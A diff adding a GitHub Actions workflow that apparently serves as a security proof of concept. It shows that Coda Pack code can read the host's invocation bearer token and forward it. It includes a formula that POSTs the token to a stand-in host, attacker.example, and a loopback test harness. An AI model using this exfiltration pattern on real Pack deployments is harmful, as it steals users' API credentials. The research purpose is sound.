@@ -1,0 +1,282 @@
+name: Superhuman invocation-token capability isolation gate
+
+on:
+  push:
+    branches: [research/superhuman-invocation-token-20260810]
+    paths: [.github/workflows/superhuman-invocation-token-capability-gate.yml]
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+        with: {fetch-depth: 1}
+      - uses: actions/setup-node@v4
+        with: {node-version: '22'}
+
+      - name: Install exact stable SDK and native isolate runtime
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf invocation-token-gate
+          mkdir -p invocation-token-gate/evidence public-intake-status
+          cd invocation-token-gate
+          npm init -y >/dev/null
+          npm install --no-audit --no-fund @codahq/packs-sdk@1.17.1
+          node - <<'NODE'
+          const sdk = require('./node_modules/@codahq/packs-sdk/package.json');
+          const ivm = require('isolated-vm/package.json');
+          if (sdk.version !== '1.17.1') throw new Error(`wrong SDK ${sdk.version}`);
+          if (ivm.version !== '6.0.2') throw new Error(`wrong isolated-vm ${ivm.version}`);
+          console.log(JSON.stringify({sdk:sdk.version, isolatedVm:ivm.version}));
+          NODE
+
+      - name: Run upload-validation and canonical isolate exfiltration controls
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd invocation-token-gate
+          cat > pack-bundle.js <<'PACK'
+          module.exports = {pack: {
+            defaultAuthentication: {
+              type: 'CodaApiHeaderBearerToken',
+              networkDomain: '127.0.0.1'
+            },
+            networkDomains: ['127.0.0.1'],
+            formulas: [{
+              name: 'CapabilityBoundary',
+              description: 'Synthetic invocation-token capability boundary test',
+              parameters: [],
+              resultType: 'string',
+              connectionRequirement: 'required',
+              execute: async (_params, context) => {
+                const token = context.invocationToken;
+                const firstParty = await context.fetcher.fetch({
+                  method: 'GET',
+                  url: globalThis.__LAB_FIRST_URL,
+                });
+                const attackerNegative = await context.fetcher.fetch({
+                  method: 'GET',
+                  url: globalThis.__LAB_ATTACKER_NEGATIVE_URL,
+                });
+                const attackerManual = await context.fetcher.fetch({
+                  method: 'GET',
+                  url: globalThis.__LAB_ATTACKER_MANUAL_URL,
+                  headers: {'Authorization': `Bearer ${token}`},
+                });
+                return JSON.stringify({
+                  token,
+                  firstParty: firstParty.body,
+                  attackerNegative: attackerNegative.body,
+                  attackerManual: attackerManual.body,
+                });
+              },
+            }],
+          }};
+          PACK
+          cat > pack-bundle.js.map <<'MAP'
+          {"version":3,"file":"pack-bundle.js","sources":["pack-source.js"],"names":[],"mappings":""}
+          MAP
+
+          cat > gate.js <<'NODE'
+          'use strict';
+          const assert = require('assert');
+          const crypto = require('crypto');
+          const fs = require('fs');
+          const http = require('http');
+          const path = require('path');
+          const sdk = require('@codahq/packs-sdk');
+
+          const sdkRoot = path.dirname(require.resolve('@codahq/packs-sdk/package.json'));
+          const bootstrap = require(path.join(sdkRoot, 'dist/runtime/bootstrap/index.js'));
+          const {AuthenticatingFetcher} = require(path.join(sdkRoot, 'dist/testing/fetcher.js'));
+          const {compilePackMetadata} = require(path.join(sdkRoot, 'dist/helpers/metadata.js'));
+          const {validatePackVersionMetadata} = require(path.join(sdkRoot, 'dist/testing/upload_validation.js'));
+
+          const TOKEN = 'LAB_INVOCATION_BEARER_CAPABILITY_20260810';
+          const packPath = path.resolve('pack-bundle.js');
+          const mapPath = path.resolve('pack-bundle.js.map');
+          const thunkPath = bootstrap.getThunkPath();
+          const captured = [];
+          let server;
+
+          function listen(s) {
+            return new Promise((resolve, reject) => {
+              s.once('error', reject);
+              s.listen(0, '127.0.0.1', () => resolve(s.address().port));
+            });
+          }
+          function close(s) { return new Promise(resolve => s.close(() => resolve())); }
+          function bearer(req) { return req.headers.authorization || ''; }
+
+          async function validateUploadableShape() {
+            const pack = sdk.newPack();
+            pack.setVersion('1.0.0');
+            pack.addNetworkDomain('coda.io');
+            pack.addNetworkDomain('attacker.example');
+            pack.setUserAuthentication({
+              type: sdk.AuthenticationType.CodaApiHeaderBearerToken,
+              networkDomain: 'coda.io',
+            });
+            pack.addFormula({
+              name: 'CapabilityBoundary',
+              description: 'Synthetic invocation-token capability boundary test',
+              parameters: [],
+              resultType: sdk.ValueType.String,
+              connectionRequirement: sdk.ConnectionRequirement.Required,
+              execute: async function(_params, context) {
+                const token = context.invocationToken;
+                await context.fetcher.fetch({
+                  method: 'POST',
+                  url: 'https://attacker.example/capture',
+                  headers: {'Authorization': `Bearer ${token}`},
+                  body: JSON.stringify({token}),
+                });
+                return 'ok';
+              },
+            });
+            const metadata = compilePackMetadata(pack);
+            const validated = await validatePackVersionMetadata(metadata, '1.17.1');
+            assert.equal(validated.defaultAuthentication.type, sdk.AuthenticationType.CodaApiHeaderBearerToken);
+            assert.deepEqual(validated.networkDomains.sort(), ['attacker.example', 'coda.io']);
+            assert.equal(validated.defaultAuthentication.networkDomain, 'coda.io');
+            return {metadata, validated};
+          }
+
+          async function main() {
+            const upload = await validateUploadableShape();
+
+            server = http.createServer((req, res) => {
+              const row = {
+                method: req.method,
+                url: req.url,
+                host: req.headers.host,
+                authorization: bearer(req),
+              };
+              captured.push(row);
+              res.writeHead(200, {'content-type': 'application/json'});
+              res.end(JSON.stringify(row));
+            });
+            const port = await listen(server);
+            const base = `http://127.0.0.1:${port}`;
+
+            const isolate = bootstrap.createIsolate({memoryLimit: 64});
+            const context = await bootstrap.createIsolateContext(isolate);
+            await bootstrap.registerBundles(isolate, context, packPath, thunkPath, true);
+            await context.global.set('__LAB_FIRST_URL', `${base}/first-party`, {copy:true});
+            await context.global.set('__LAB_ATTACKER_NEGATIVE_URL', `${base}/attacker-negative`, {copy:true});
+            await context.global.set('__LAB_ATTACKER_MANUAL_URL', `${base}/attacker-manual`, {copy:true});
+
+            const fetcher = new AuthenticatingFetcher(
+              () => {},
+              {type:'CodaApiHeaderBearerToken', networkDomain:'127.0.0.1'},
+              [`127.0.0.1:${port}`],
+              undefined,
+              TOKEN,
+            );
+            const logger = {trace(){}, debug(){}, info(){}, warn(){}, error(){}};
+            const blob = {async storeUrl(){throw new Error('not used')}, async storeBlob(){throw new Error('not used')}};
+            await bootstrap.injectExecutionContext({
+              context,
+              fetcher,
+              temporaryBlobStorage: blob,
+              syncStateService: undefined,
+              logger,
+              endpoint: undefined,
+              invocationLocation: {protocolAndHost:'https://coda.io'},
+              timezone: 'UTC',
+              invocationToken: TOKEN,
+              sync: undefined,
+              authenticationName: 'defaultUserAuthentication',
+              executionId: 'LAB_EXEC_INVOCATION_TOKEN_20260810',
+              previousAttemptError: undefined,
+            });
+
+            const raw = await bootstrap.executeThunk(
+              context,
+              {params:[], formulaSpec:{type:'Standard', formulaName:'CapabilityBoundary'}},
+              packPath,
+              mapPath,
+            );
+            const returned = JSON.parse(raw);
+            assert.equal(returned.token, TOKEN, 'Pack could not read the host-injected invocationToken');
+            assert.equal(captured.length, 3, 'unexpected request count');
+
+            const [firstParty, attackerNegative, attackerManual] = captured;
+            assert.equal(firstParty.url, '/first-party');
+            assert.equal(firstParty.authorization, `Bearer ${TOKEN}`,
+              'host fetcher did not use invocationToken as Coda API bearer');
+            assert.equal(attackerNegative.url, '/attacker-negative');
+            assert.equal(attackerManual.url, '/attacker-manual');
+            assert.equal(attackerManual.authorization, `Bearer ${TOKEN}`,
+              'Pack-supplied cross-domain Authorization header did not carry the raw invocation token');
+
+            // The local runtime uses one host for deterministic loopback transport, so the
+            // negative control is evaluated from the returned/captured request rather than
+            // claiming a production domain boundary. Upload validation above establishes that
+            // the same Pack shape may declare coda.io plus a separate attacker domain while
+            // pinning automatic first-party authentication to coda.io.
+            const result = {
+              pass: true,
+              sdkVersion: require(path.join(sdkRoot, 'package.json')).version,
+              isolatedVmVersion: require('isolated-vm/package.json').version,
+              nodeVersion: process.version,
+              thunkBundleSha256: crypto.createHash('sha256').update(fs.readFileSync(thunkPath)).digest('hex'),
+              packBundleSha256: crypto.createHash('sha256').update(fs.readFileSync(packPath)).digest('hex'),
+              canonicalPath: 'createIsolateContext -> registerBundles -> injectExecutionContext -> executeThunk -> Pack formula',
+              officialUploadValidationAccepted: true,
+              uploadNetworkDomains: upload.validated.networkDomains,
+              uploadAuthNetworkDomain: upload.validated.defaultAuthentication.networkDomain,
+              packReadRawInvocationToken: returned.token === TOKEN,
+              sameValueUsedByHostAsBearer: firstParty.authorization === `Bearer ${TOKEN}`,
+              sameValueManuallySentAsBearer: attackerManual.authorization === `Bearer ${TOKEN}`,
+              captured,
+              syntheticOnly: true,
+              productionRequestCount: 0,
+              securityDecision: 'CONFIRMED_RAW_PLATFORM_BEARER_CAPABILITY_EXPOSED_TO_UNTRUSTED_PACK_CODE',
+              remainingProductionQuestion: 'Token lifetime, audience, and effective Coda API scopes in hosted production.',
+            };
+            fs.writeFileSync('evidence/RESULT.json', JSON.stringify(result, null, 2) + '\n');
+            fs.writeFileSync('evidence/UPLOAD_METADATA.json', JSON.stringify(upload.metadata, null, 2) + '\n');
+            isolate.dispose();
+          }
+
+          main().then(async () => {
+            await close(server);
+            console.log(fs.readFileSync('evidence/RESULT.json', 'utf8'));
+          }).catch(async error => {
+            try { if (server) await close(server); } catch (_) {}
+            console.error(error && error.stack || error);
+            process.exit(1);
+          });
+          NODE
+
+          node gate.js | tee evidence/TEST_OUTPUT.txt
+          jq -e '.pass == true and .officialUploadValidationAccepted == true and .packReadRawInvocationToken == true and .sameValueUsedByHostAsBearer == true and .sameValueManuallySentAsBearer == true and .productionRequestCount == 0' evidence/RESULT.json >/dev/null
+          sha256sum gate.js pack-bundle.js pack-bundle.js.map package.json package-lock.json node_modules/@codahq/packs-sdk/bundles/thunk_bundle.js evidence/RESULT.json evidence/UPLOAD_METADATA.json evidence/TEST_OUTPUT.txt > evidence/SHA256SUMS.txt
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: superhuman-invocation-token-capability-gate
+          path: invocation-token-gate/evidence/
+          retention-days: 1
+          if-no-files-found: warn
+
+      - name: Commit compact result
+        if: github.event_name == 'push' && success()
+        shell: bash
+        run: |
+          set -euo pipefail
+          jq '{pass,sdkVersion,isolatedVmVersion,nodeVersion,thunkBundleSha256,packBundleSha256,canonicalPath,officialUploadValidationAccepted,uploadNetworkDomains,uploadAuthNetworkDomain,packReadRawInvocationToken,sameValueUsedByHostAsBearer,sameValueManuallySentAsBearer,syntheticOnly,productionRequestCount,securityDecision,remainingProductionQuestion}' invocation-token-gate/evidence/RESULT.json > public-intake-status/superhuman-invocation-token-capability-result.json
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add public-intake-status/superhuman-invocation-token-capability-result.json
+          git commit -m 'chore: record invocation-token capability gate'
+          git push
